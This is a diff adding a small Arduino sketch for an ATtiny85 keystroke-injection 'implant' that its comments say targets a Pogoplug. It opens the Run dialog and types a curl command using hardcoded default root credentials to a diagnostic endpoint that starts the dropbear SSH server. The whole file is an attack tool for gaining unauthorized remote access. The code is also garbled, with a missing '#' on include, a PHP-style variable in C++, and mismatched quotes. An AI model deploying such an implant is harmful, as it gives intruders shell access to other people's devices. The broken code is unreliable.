@@ -1,0 +1,17 @@
+// The ATtiny85 is such a brilliant chip for implants, so tinkering with it makes sense
+include "DigiKeyboard.h"
+
+void setup() {
+   DigiKeyboard.update();
+  
+  // Our target is the pogoplug, so we want to enable SSH access to a design by simply inserting our custom PCB key into the device
+  $cmd = 'curl -k “https://root:ceadmin@localhost/sqdiag/HBPlug?action=command&command=dropbear%20start"'
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.println($cmd );
+  DigiKeyboard.delay(1000);
+
+}
+
+void loop() {
+}
